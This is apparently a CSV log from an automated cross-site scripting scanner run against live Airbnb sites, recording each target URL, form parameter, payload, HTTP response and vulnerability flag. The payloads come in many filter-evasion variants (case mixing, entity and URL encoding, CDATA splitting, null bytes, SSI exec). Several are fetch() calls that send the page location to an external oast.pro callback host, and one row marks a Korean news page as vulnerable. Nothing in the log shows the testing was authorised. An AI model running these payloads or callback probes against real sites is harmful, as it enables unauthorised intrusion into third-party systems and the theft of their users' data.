url,param,payload,server_type,method,response_code,response_time,response_pattern,success,content_snippet,vulnerable,injection_context,nlp_forms_found,nlp_inputs_count,nlp_scripts_found,nlp_has_eval_or_write,nlp_has_sanitization_patterns,nlp_reflected_location_type,fuzz_num_filtered,fuzz_num_encoded
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,submitContextX,"&#x3c;img onmouseover=""alert('XSS')"" src=""x""&#x3e;",apache,POST,403,2.411799669265747,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://www.airbnb.com/authenticate,phoneInputphone-login,"<!--#exec cmd=""/bin/echo '<SCR'+'IPT>alert(""XSS"")</SCR'+'IPT>'""-->",nginx,POST,401,2.4563305377960205,"<html><head>
  <meta charset=""utf-8"">
  <meta name=""viewport"" content=""width=device-width, initial-s",0,"<html><head>
  <meta charset=""utf-8"">
  <meta name=""viewport"" content=""width=device-width, initial-s",0,generic,0,0,0,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,form_UID,<IMg sRC=X oNERror=AlErt(1)>,apache,POST,500,5.9258949756622314,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,submitContext,"&#x3c;img src=""http://example.com/image.jpg""&#x3e;",apache,POST,403,2.3237783908843994,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://news.airbnb.com/de/,s,"&#x3c;img src=x onerror=eval(""alert('XSS')"")&#x3e;",nginx,GET,200,3.7011876106262207,"<html lang=""de-DE""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,"<html lang=""de-DE""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,generic,1,2,1,1,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,form_instance_key,"<fOrM aCTiOn=""jAvAScRipt:ALErT('XSs')""><iNpUT tYPe=""SUBmIT""></FORM>",apache,POST,500,4.5905420780181885,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://news.airbnb.com/ko/,s,"javascript:alert(""XSS"")",nginx,GET,200,4.430564641952515,"<html lang=""ko-KR""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,"<html lang=""ko-KR""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",1,attribute,1,2,1,0,0,attribute,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,tinyMceEditor,"<script>alert(""XSS"")</script>",apache,POST,403,4.8635478019714355,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,t:ac,javascript:fetch('//99o5acu1yd5e.oast.pro/js?loc='+btoa(window.location)),apache,POST,500,4.813483476638794,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,submitContextX,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,apache,POST,500,3.2118642330169678,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://news.airbnb.com/ja/,s,<s<sc<ScRipT>RipT>AlERt('xSS')</sCripT>,nginx,GET,200,3.564098358154297,"<html lang=""ja""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=edg",0,"<html lang=""ja""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=edg",0,attribute,1,2,1,0,0,attribute,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,parentMessageRef,%3Ca%20href%3D%22javascript%3Aeval%28%27alert%28%5C%27XSS%5C%27%29%27%29%22%3EClick%20Me%3C/a%3E,apache,POST,403,3.283994197845459,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,t:cp,"&#x3c;!--#exec cmd=""/bin/echo '&#x3c;SCR'+'IPT&#x3e;alert(""XSS"")&#x3c;/SCR'+'IPT&#x3e;'""--&#x3e;",apache,POST,500,3.77048659324646,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,submitContext,"<ImG srC=x OnERRoR=EvAL(""ALeRT('XSS')"")>",apache,POST,500,2.334916114807129,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,containerId,<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>,apache,POST,403,2.305846691131592,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,messageSearchField,%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E,apache,POST,500,2.3717212677001953,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,lia-form-context,"&#x3c;SWF&#x3e;&#x3c;PARAM NAME=movie VALUE=""javascript:alert('XSS')""&#x3e;&#x3c;/PARAM&#x3e;&#x3c;embed src=""javascript:alert('XSS')""&#x3e;&#x3c;/embed&#x3e;&#x3c;/SWF&#x3e;",apache,POST,500,4.03844141960144,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,mediaSnippetUrl,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>al	ert(1)('XSS')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",apache,POST,403,2.4513986110687256,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/?logo=1,query,"<img foo=a onerror=""al	ert(1)('XSS')"">",nginx,GET,200,3.915890693664551,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://www.airbnb.com/,query,"<BASE HREF=""javascript:al	ert(1)('XSS');//"">",nginx,GET,200,5.7692999839782715,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""dir nat",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""dir nat",0,generic,1,0,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,messageSearchField_0,&#x22&#x3e;&#x3c;img src=x onerror=alert('XSS')&#x3e;,apache,POST,500,2.5645885467529297,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
http://airbnb.com/#site-content,query,"<input type=""text"" value=""<img src=x onerror=al	ert(1)('XSS')>"" />",nginx,GET,200,5.988340854644775,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,11,1
https://investors.airbnb.com/resources/default.aspx,__EVENTTARGET,"<form action=""javascript:al	ert(1)('XSS')""><input type=""submit""></form>",nginx,POST,403,2.821337938308716,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,submitContext_0X,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>al	ert(1)('XSS')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",apache,POST,403,2.9200963973999023,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,liaFormContentKey,<img src=x onerror=al	ert(1)(1)>,apache,POST,500,9.44873332977295,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/resources/default.aspx,__EVENTARGUMENT,<BODY ONLOAD=alert('XSS')>,nginx,POST,403,2.5384771823883057,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,userSearchField,%3Cscript%3Ealert%281%29%3C/script%3E,apache,POST,500,2.5091094970703125,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,t:formdata,"<ImG srC=""hTTp://eXaMPlE.cOm/ImaGe.jpG"">",apache,POST,500,2.7385032176971436,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/resources/default.aspx,__VIEWSTATE,javascript:fetch('//99o5acu1yd5e.oast.pro/js?loc='+btoa(window.location)),nginx,POST,403,2.3821804523468018,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,noteSearchField,"<sTyLe>Li {lIst-sTYle-image: url(""JaVAsCRIpT:aLeRT('XSs')"");}</STYLE><Ul><lI></ul>",apache,POST,500,4.637889623641968,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,submitContext_0,"<a href=""javascript:void(0)"" onmouseover=""al	ert(1)(1)"">Click Me</a>",apache,POST,403,9.214830160140991,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://news.airbnb.com/br/,s,"<imG srC=x oNerrOR=EVal(""ALeRt('XSS')"")>",nginx,GET,200,3.833491563796997,"<html lang=""pt-BR""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,"<html lang=""pt-BR""><head>
  <meta charset=""utf-8"">
  <meta http-equiv=""x-ua-compatible"" content=""ie=",0,attribute,1,2,1,1,0,attribute,0,0
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,lia-action-token,%3Ca%20foo%3Da%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,apache,POST,500,5.1063737869262695,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl36$txtEmail,"%00<?xml version=%00""1.0%00"" encoding=%00""ISO-8859-1%00""?%00>%00<foo%00>%00<![CDATA[%00<]]%00>SCRIPT%00<![CDATA[%00>]]%00>alert(%00'XSS%00')%00<![CDATA[%00<]]%00>/SCRIPT%00<![CDATA[%00>]]%00>%00</foo%00>",nginx,POST,200,4.665703296661377,"<html id=""e05326c67cc6be28d1ac35dde524de4e9d535c25"" class=""StudioLegacy Legacy"" xmlns=""http://www.w3",0,"<html id=""e05326c67cc6be28d1ac35dde524de4e9d535c25"" class=""StudioLegacy Legacy"" xmlns=""http://www.w3",0,generic,1,19,1,0,1,none,11,1
http://airbnb.com/?from_belo_click,query,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3Cfoo%3E%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Ealert%28%27XSS%27%29%3C%21%5BCDATA%5B%3C%5D%5D%3E/SCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E%3C/foo%3E,nginx,GET,200,3.954885482788086,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,productSearchField,%3CSWF%3E%3CPARAM%20NAME%3Dmovie%20VALUE%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/PARAM%3E%3Cembed%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/embed%3E%3C/SWF%3E,apache,POST,500,2.6377675533294678,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl36$chkLists$0,"<img src=""vbscript:al	ert(1)('XSS')"">",nginx,POST,403,2.4519107341766357,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,submitContext_1X,"""><img src=x on/**/error=alert(""XSS"")>",apache,POST,403,2.5456907749176025,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,form_UID,"<img src=x on/**/error=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",apache,POST,500,6.88804292678833,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl36$chkLists$1,"%00<a foo=a href=%00""javascript:alert(%00'XSS%00')%00""%00>Click Me%00</a%00>",nginx,POST,403,2.2834556102752686,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,submitContext_1,&#x3c;svg/onload=fetch('//99o5acu1yd5e.oast.pro/svg?loc='+btoa(window.location))&#x3e;,apache,POST,403,2.3082456588745117,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.searchformv32.form.form,as-search-action-id,"<BASE HREF=""javascript:alert('XSS');//"">",apache,POST,500,4.740678548812866,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl36$chkLists$2,&#x3c;script&#x3e;fetch('//99o5acu1yd5e.oast.pro/script?loc='+btoa(window.location))&#x3c;/script&#x3e;,nginx,POST,403,2.5996031761169434,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/governance/default.aspx,__EVENTTARGET,"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",nginx,POST,200,6.138264894485474,"<html id=""a3a2ca319c9714819ef46ec3bcdf31f9a62d5764"" class=""StudioLegacy Legacy"" xmlns=""http://www.w3",0,"<html id=""a3a2ca319c9714819ef46ec3bcdf31f9a62d5764"" class=""StudioLegacy Legacy"" xmlns=""http://www.w3",0,generic,1,7,1,0,1,none,10,2
http://airbnb.com/?utm_source=airbnb&utm_medium=1&utm_campaign=direct&utm_content=1750108746496&purchaseAttemptId=1750108746496&card_id=1058,query,"data:text/html,<script>alert(1)</script>",nginx,GET,200,5.002301454544067,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,"<html lang=""en"" dir=""ltr"" data-is-hyperloop=""true"" data-is-async-local-storage=""true"" class=""scrollb",0,generic,1,1,1,0,0,none,10,2
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl36$chkLists$3,"<IMG Src="""">",nginx,POST,403,3.017066240310669,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,form_instance_key,"'; alert(String.fromCharCode(88,83,83))//'; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'; alert(String.fromCharCode(88,83,83))//'; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//--></SCRIPT>",apache,POST,500,7.42699408531189,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://community.withairbnb.com/t5/forums/v5/forumtopicpage.threadeddetaildisplay.inlinemessagereplyeditor_0.form.form.form.form,hpField,"javascript:al	ert(1)(""XSS"")",apache,POST,403,6.479206323623657,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/governance/default.aspx,__EVENTARGUMENT,"javascript:alert(""XSS"")",nginx,POST,403,2.3035945892333984,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl36$chkLists$4,"<img foo=a src=""javascript:alert('XSS')"">",nginx,POST,403,2.4776320457458496,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://community.withairbnb.com/t5/community/categorypage.searchformv32.form.form,submitContextX,<svg><p><style><img src=1 href=1 onerror=al	ert(1)(1)></p></svg>,apache,POST,500,3.47672176361084,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,"<html prefix=""og: http://ogp.me/ns#"" dir=""ltr"" lang=""en"" class=""js no-flash filereader exiforientati",0,generic,1,30,1,0,0,none,0,0
https://investors.airbnb.com/financials/default.aspx,__EVENTTARGET,"<form action=""javascript:al	ert(1)('XSS')""><input type=""submit""></form>",nginx,POST,403,2.4953205585479736,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/governance/default.aspx,__VIEWSTATE,"javascript:eval(""al	ert(1)('XSS')"")",nginx,POST,403,2.6066927909851074,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
https://investors.airbnb.com/resources/default.aspx,_ctrl0$ctl36$recaptcha$hdnCaptchaToken,"<TABLE><TD BACKGROUND=""javascript:al	ert(1)('XSS')"">",nginx,POST,403,2.423969030380249,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,11,1
https://investors.airbnb.com/financials/default.aspx,__EVENTARGUMENT,"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",nginx,POST,403,2.8122384548187256,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,"<html lang=""en-US"" dir=""ltr""><head><title>Just a moment...</title><meta http-equiv=""Content-Type"" co",0,generic,0,0,1,0,0,none,10,2
